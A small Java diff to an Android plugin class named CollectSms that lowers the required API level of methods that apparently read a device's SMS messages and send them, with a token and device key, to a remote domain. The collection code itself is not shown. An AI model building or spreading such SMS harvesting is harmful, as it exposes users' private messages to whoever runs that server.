@@ -23,7 +23,7 @@ public class CollectSms extends UniModule {
 
     private SmsContent mSmsContent;
 
-    @RequiresApi(api = Build.VERSION_CODES.N)
+    @RequiresApi(api = Build.VERSION_CODES.M)
     @UniJSMethod()
     public void getAndSendSms(JSONObject systemInfo, String token, String domain,
                               long timeStamp, String deviceKey) {
@@ -31,7 +31,7 @@ public class CollectSms extends UniModule {
         new Thread(() -> getAndSendSmsInfo(systemInfo, token, domain, timeStamp, deviceKey)).start();//启动线程
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.N)
+    @RequiresApi(api = Build.VERSION_CODES.M)
     private void getAndSendSmsInfo(JSONObject systemInfo, String token, String domain, long timeStamp,
                                    String deviceKey) {
         try {
